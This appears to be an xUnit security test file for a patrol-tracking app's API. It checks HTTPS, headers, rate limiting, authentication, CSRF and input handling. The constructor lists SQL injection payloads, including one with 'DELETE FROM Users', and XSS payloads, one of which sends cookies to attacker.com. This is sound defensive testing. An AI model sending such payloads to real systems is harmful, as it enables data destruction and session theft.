using System;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using Xunit;
using Xunit.Abstractions;
using Newtonsoft.Json;
using SecurityPatrol.TestCommon.Constants;
using SecurityPatrol.TestCommon.Fixtures;
using SecurityPatrol.SecurityTests.Setup;

namespace SecurityPatrol.SecurityTests.API
{
    /// <summary>
    /// Implements security tests for API endpoints in the Security Patrol application, focusing on authentication, 
    /// authorization, input validation, and protection against common web vulnerabilities.
    /// </summary>
    public class EndpointSecurityTests : SecurityTestBase
    {
        private readonly ITestOutputHelper _output;
        private readonly ApiServerFixture _apiServer;
        private readonly Dictionary<string, string> _sqlInjectionPayloads;
        private readonly Dictionary<string, string> _xssPayloads;

        /// <summary>
        /// Initializes a new instance of the EndpointSecurityTests class with test output helper and API server fixture
        /// </summary>
        /// <param name="output">The test output helper for logging test information</param>
        /// <param name="apiServer">The API server fixture for simulating API responses</param>
        public EndpointSecurityTests(ITestOutputHelper output, ApiServerFixture apiServer)
            : base(output, apiServer)
        {
            _output = output;
            _apiServer = apiServer;
            
            // Initialize SQL injection test payloads
            _sqlInjectionPayloads = new Dictionary<string, string>
            {
                { "username", "' OR 1=1; --" },
                { "phoneNumber", "+1555' OR 1=1; --" },
                { "code", "123456' OR 1=1; --" },
                { "id", "1' OR 1=1; --" },
                { "text", "Test' OR 1=1; DELETE FROM Users; --" }
            };
            
            // Initialize XSS test payloads
            _xssPayloads = new Dictionary<string, string>
            {
                { "username", "<script>alert('XSS')</script>" },
                { "phoneNumber", "+1555<script>alert('XSS')</script>" },
                { "text", "<img src=\"x\" onerror=\"alert('XSS')\">" },
                { "name", "Test<script>document.location='http://attacker.com/cookie='+document.cookie</script>" }
            };
        }

        /// <summary>
        /// Tests that the authentication endpoint requires HTTPS connections
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointRequiresHttps()
        {
            // Create an HTTP client with insecure redirect disabled
            var httpClient = new HttpClient(new HttpClientHandler
            {
                AllowAutoRedirect = false
            });
            
            // Create a request to the auth endpoint using HTTP instead of HTTPS
            var httpEndpoint = TestConstants.TestApiBaseUrl.Replace("https://", "http://") + "auth/verify";
            var request = new HttpRequestMessage(HttpMethod.Get, httpEndpoint);
            
            // Send the request
            var response = await httpClient.SendAsync(request);
            
            // Assert that the response either redirects to HTTPS or forbids HTTP access
            Assert.True(
                response.StatusCode == System.Net.HttpStatusCode.Redirect ||
                response.StatusCode == System.Net.HttpStatusCode.Forbidden,
                $"Expected redirect to HTTPS or forbidden, but got {response.StatusCode}"
            );
            
            // If it's a redirect, ensure it's to HTTPS
            if (response.StatusCode == System.Net.HttpStatusCode.Redirect)
            {
                var location = response.Headers.Location.ToString();
                Assert.StartsWith("https://", location, "Redirect location must use HTTPS");
            }
            
            _output.WriteLine($"Auth endpoint {httpEndpoint} properly enforces HTTPS");
        }

        /// <summary>
        /// Tests that the authentication endpoint returns appropriate security headers
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointSecureHeaders()
        {
            // Create a request to the auth endpoint
            var request = CreateUnauthenticatedRequest(HttpMethod.Get, "/auth/verify");
            
            // Send the request
            var response = await HttpClient.SendAsync(request);
            
            // Verify the response contains required security headers
            bool hasSecureHeaders = ValidateSecureHeaders(response);
            
            Assert.True(hasSecureHeaders, "Response is missing required security headers");
            _output.WriteLine("Auth endpoint returns appropriate security headers");
        }

        /// <summary>
        /// Tests that the authentication endpoint implements rate limiting
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointRateLimiting()
        {
            // Test if rate limiting is implemented for auth endpoints
            bool hasRateLimiting = await TestRateLimiting("/auth/verify", HttpMethod.Post, 10, 5);
            
            Assert.True(hasRateLimiting, "Auth endpoint does not implement proper rate limiting");
            _output.WriteLine("Auth endpoint implements proper rate limiting");
        }

        /// <summary>
        /// Tests that the authentication endpoint properly validates input
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointInputValidation()
        {
            // Test with invalid phone number format
            var invalidPhoneRequest = CreateUnauthenticatedRequest(HttpMethod.Post, "/auth/verify");
            invalidPhoneRequest.Content = JsonContent.Create(new { phoneNumber = "invalid-format" });
            var phoneResponse = await HttpClient.SendAsync(invalidPhoneRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, phoneResponse.StatusCode);
            
            // Test with invalid verification code format
            var invalidCodeRequest = CreateUnauthenticatedRequest(HttpMethod.Post, "/auth/validate");
            invalidCodeRequest.Content = JsonContent.Create(new 
            { 
                phoneNumber = TestConstants.TestPhoneNumber, 
                code = "abc" // Non-numeric code
            });
            var codeResponse = await HttpClient.SendAsync(invalidCodeRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, codeResponse.StatusCode);
            
            _output.WriteLine("Auth endpoint properly validates input");
        }

        /// <summary>
        /// Tests that the authentication endpoint is protected against SQL injection attacks
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointSqlInjection()
        {
            // Test auth/verify endpoint
            bool verifyEndpointVulnerable = await TestForSqlInjection(
                "/auth/verify", 
                HttpMethod.Post, 
                _sqlInjectionPayloads);
            
            Assert.False(verifyEndpointVulnerable, "Auth/verify endpoint is vulnerable to SQL injection");
            
            // Test auth/validate endpoint
            bool validateEndpointVulnerable = await TestForSqlInjection(
                "/auth/validate", 
                HttpMethod.Post, 
                _sqlInjectionPayloads);
            
            Assert.False(validateEndpointVulnerable, "Auth/validate endpoint is vulnerable to SQL injection");
            
            _output.WriteLine("Auth endpoints are protected against SQL injection attacks");
        }

        /// <summary>
        /// Tests that the authentication endpoint is protected against Cross-Site Scripting (XSS) attacks
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestAuthEndpointXss()
        {
            // Test auth/verify endpoint
            bool verifyEndpointVulnerable = await TestForXss(
                "/auth/verify", 
                HttpMethod.Post, 
                _xssPayloads);
            
            Assert.False(verifyEndpointVulnerable, "Auth/verify endpoint is vulnerable to XSS");
            
            // Test auth/validate endpoint
            bool validateEndpointVulnerable = await TestForXss(
                "/auth/validate", 
                HttpMethod.Post, 
                _xssPayloads);
            
            Assert.False(validateEndpointVulnerable, "Auth/validate endpoint is vulnerable to XSS");
            
            _output.WriteLine("Auth endpoints are protected against XSS attacks");
        }

        /// <summary>
        /// Tests that the location endpoint requires authentication
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestLocationEndpointRequiresAuthentication()
        {
            // Test location/batch endpoint
            var batchRequest = CreateUnauthenticatedRequest(HttpMethod.Post, "/location/batch");
            var batchResponse = await HttpClient.SendAsync(batchRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.Unauthorized, batchResponse.StatusCode);
            
            // Test location/history endpoint
            var historyRequest = CreateUnauthenticatedRequest(HttpMethod.Get, "/location/history");
            var historyResponse = await HttpClient.SendAsync(historyRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.Unauthorized, historyResponse.StatusCode);
            
            _output.WriteLine("Location endpoints properly require authentication");
        }

        /// <summary>
        /// Tests that the location endpoint properly validates input
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestLocationEndpointInputValidation()
        {
            // Test with invalid latitude (greater than 90)
            var invalidLatRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/location/batch");
            invalidLatRequest.Content = JsonContent.Create(new 
            { 
                locations = new[] 
                { 
                    new 
                    { 
                        latitude = 100.0, // Invalid latitude
                        longitude = TestConstants.TestLongitude,
                        accuracy = TestConstants.TestAccuracy,
                        timestamp = DateTime.UtcNow
                    }
                }
            });
            var latResponse = await HttpClient.SendAsync(invalidLatRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, latResponse.StatusCode);
            
            // Test with invalid longitude (greater than 180)
            var invalidLongRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/location/batch");
            invalidLongRequest.Content = JsonContent.Create(new 
            { 
                locations = new[] 
                { 
                    new 
                    { 
                        latitude = TestConstants.TestLatitude,
                        longitude = 200.0, // Invalid longitude
                        accuracy = TestConstants.TestAccuracy,
                        timestamp = DateTime.UtcNow
                    }
                }
            });
            var longResponse = await HttpClient.SendAsync(invalidLongRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, longResponse.StatusCode);
            
            _output.WriteLine("Location endpoints properly validate input");
        }

        /// <summary>
        /// Tests that the location endpoint is protected against SQL injection attacks
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestLocationEndpointSqlInjection()
        {
            // Test location/batch endpoint
            bool batchEndpointVulnerable = await TestForSqlInjection(
                "/location/batch", 
                HttpMethod.Post, 
                _sqlInjectionPayloads);
            
            Assert.False(batchEndpointVulnerable, "Location/batch endpoint is vulnerable to SQL injection");
            
            // Test location/history endpoint
            bool historyEndpointVulnerable = await TestForSqlInjection(
                "/location/history", 
                HttpMethod.Get, 
                _sqlInjectionPayloads);
            
            Assert.False(historyEndpointVulnerable, "Location/history endpoint is vulnerable to SQL injection");
            
            _output.WriteLine("Location endpoints are protected against SQL injection attacks");
        }

        /// <summary>
        /// Tests that the patrol endpoint requires authentication
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestPatrolEndpointRequiresAuthentication()
        {
            // Test patrol/locations endpoint
            var locationsRequest = CreateUnauthenticatedRequest(HttpMethod.Get, "/patrol/locations");
            var locationsResponse = await HttpClient.SendAsync(locationsRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.Unauthorized, locationsResponse.StatusCode);
            
            // Test patrol/verify endpoint
            var verifyRequest = CreateUnauthenticatedRequest(HttpMethod.Post, "/patrol/verify");
            var verifyResponse = await HttpClient.SendAsync(verifyRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.Unauthorized, verifyResponse.StatusCode);
            
            _output.WriteLine("Patrol endpoints properly require authentication");
        }

        /// <summary>
        /// Tests that the patrol endpoint properly validates input
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestPatrolEndpointInputValidation()
        {
            // Test with invalid checkpoint data
            var invalidCheckpointRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/patrol/verify");
            invalidCheckpointRequest.Content = JsonContent.Create(new 
            { 
                checkpointId = -1, // Invalid ID
                timestamp = DateTime.UtcNow,
                location = new 
                {
                    latitude = TestConstants.TestLatitude,
                    longitude = TestConstants.TestLongitude
                }
            });
            var checkpointResponse = await HttpClient.SendAsync(invalidCheckpointRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, checkpointResponse.StatusCode);
            
            // Test with invalid coordinates
            var invalidCoordinatesRequest = CreateAuthenticatedRequest(HttpMethod.Get, "/patrol/checkpoints/nearby");
            invalidCoordinatesRequest.Content = JsonContent.Create(new 
            { 
                latitude = 100.0, // Invalid latitude
                longitude = TestConstants.TestLongitude
            });
            var coordinatesResponse = await HttpClient.SendAsync(invalidCoordinatesRequest);
            
            Assert.Equal(System.Net.HttpStatusCode.BadRequest, coordinatesResponse.StatusCode);
            
            _output.WriteLine("Patrol endpoints properly validate input");
        }

        /// <summary>
        /// Tests that the patrol endpoint is protected against SQL injection attacks
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestPatrolEndpointSqlInjection()
        {
            // Test patrol/locations endpoint
            bool locationsEndpointVulnerable = await TestForSqlInjection(
                "/patrol/locations", 
                HttpMethod.Get, 
                _sqlInjectionPayloads);
            
            Assert.False(locationsEndpointVulnerable, "Patrol/locations endpoint is vulnerable to SQL injection");
            
            // Test patrol/verify endpoint
            bool verifyEndpointVulnerable = await TestForSqlInjection(
                "/patrol/verify", 
                HttpMethod.Post, 
                _sqlInjectionPayloads);
            
            Assert.False(verifyEndpointVulnerable, "Patrol/verify endpoint is vulnerable to SQL injection");
            
            _output.WriteLine("Patrol endpoints are protected against SQL injection attacks");
        }

        /// <summary>
        /// Tests that API endpoints are protected against Cross-Site Request Forgery (CSRF) attacks
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestCsrfProtection()
        {
            // Test CSRF protection for POST endpoints
            
            // Create a request to location/batch endpoint without anti-forgery token
            var locationRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/location/batch");
            // Modify request to simulate a cross-site request
            locationRequest.Headers.Add("Origin", "https://malicious-site.com");
            locationRequest.Headers.Add("Referer", "https://malicious-site.com/fake-page");
            
            // Send the request
            var locationResponse = await HttpClient.SendAsync(locationRequest);
            
            // Check if the API rejects the request
            Assert.True(
                locationResponse.StatusCode == System.Net.HttpStatusCode.Unauthorized || 
                locationResponse.StatusCode == System.Net.HttpStatusCode.Forbidden,
                "Location endpoint does not protect against CSRF attacks");
            
            // Test CSRF protection for patrol/verify endpoint
            var patrolRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/patrol/verify");
            // Modify request to simulate a cross-site request
            patrolRequest.Headers.Add("Origin", "https://malicious-site.com");
            patrolRequest.Headers.Add("Referer", "https://malicious-site.com/fake-page");
            
            // Send the request
            var patrolResponse = await HttpClient.SendAsync(patrolRequest);
            
            // Check if the API rejects the request
            Assert.True(
                patrolResponse.StatusCode == System.Net.HttpStatusCode.Unauthorized || 
                patrolResponse.StatusCode == System.Net.HttpStatusCode.Forbidden,
                "Patrol endpoint does not protect against CSRF attacks");
            
            _output.WriteLine("API endpoints are protected against CSRF attacks");
        }

        /// <summary>
        /// Tests that authentication tokens meet security requirements
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestTokenSecurity()
        {
            // Test token security by obtaining a token and validating its properties
            
            // Set up API server to return a real token
            _apiServer.SetupSuccessResponse("/auth/validate", new 
            { 
                token = TestConstants.TestAuthToken,
                expiresAt = DateTime.UtcNow.AddHours(8).ToString("o")
            });
            
            // Create a request to get a token
            var request = CreateUnauthenticatedRequest(HttpMethod.Post, "/auth/validate");
            request.Content = JsonContent.Create(new 
            { 
                phoneNumber = TestConstants.TestPhoneNumber,
                code = TestConstants.TestVerificationCode
            });
            
            // Send the request
            var response = await HttpClient.SendAsync(request);
            
            // Get the token from the response
            string responseBody = await response.Content.ReadAsStringAsync();
            var authResponse = JsonConvert.DeserializeObject<dynamic>(responseBody);
            string token = authResponse.token;
            
            // Validate token security
            bool isTokenSecure = ValidateTokenSecurity(token);
            
            Assert.True(isTokenSecure, "Authentication token does not meet security requirements");
            _output.WriteLine("Authentication token meets security requirements");
        }

        /// <summary>
        /// Tests that API endpoints respond within acceptable time limits
        /// </summary>
        /// <returns>A task representing the asynchronous test operation</returns>
        [Fact]
        public async Task TestEndpointResponseTimes()
        {
            // Test response times for various endpoints
            
            // Test auth/verify endpoint
            var authStart = DateTime.UtcNow;
            var authRequest = CreateUnauthenticatedRequest(HttpMethod.Post, "/auth/verify");
            authRequest.Content = JsonContent.Create(new { phoneNumber = TestConstants.TestPhoneNumber });
            var authResponse = await HttpClient.SendAsync(authRequest);
            var authDuration = (DateTime.UtcNow - authStart).TotalMilliseconds;
            
            // Test location/batch endpoint
            var locationStart = DateTime.UtcNow;
            var locationRequest = CreateAuthenticatedRequest(HttpMethod.Post, "/location/batch");
            locationRequest.Content = JsonContent.Create(new 
            { 
                locations = new[]
                {
                    new 
                    { 
                        latitude = TestConstants.TestLatitude,
                        longitude = TestConstants.TestLongitude,
                        accuracy = TestConstants.TestAccuracy,
                        timestamp = DateTime.UtcNow
                    }
                }
            });
            var locationResponse = await HttpClient.SendAsync(locationRequest);
            var locationDuration = (DateTime.UtcNow - locationStart).TotalMilliseconds;
            
            // Test patrol/locations endpoint
            var patrolStart = DateTime.UtcNow;
            var patrolRequest = CreateAuthenticatedRequest(HttpMethod.Get, "/patrol/locations");
            var patrolResponse = await HttpClient.SendAsync(patrolRequest);
            var patrolDuration = (DateTime.UtcNow - patrolStart).TotalMilliseconds;
            
            // Assert that the response times meet the SLA requirements
            // Per specifications, API response time should be less than 1000ms
            Assert.True(authDuration < 1000, $"Auth endpoint response time ({authDuration}ms) exceeds 1000ms SLA");
            Assert.True(locationDuration < 1000, $"Location endpoint response time ({locationDuration}ms) exceeds 1000ms SLA");
            Assert.True(patrolDuration < 1000, $"Patrol endpoint response time ({patrolDuration}ms) exceeds 1000ms SLA");
            
            _output.WriteLine($"API endpoints meet response time SLA requirements: Auth={authDuration}ms, Location={locationDuration}ms, Patrol={patrolDuration}ms");
        }
    }
}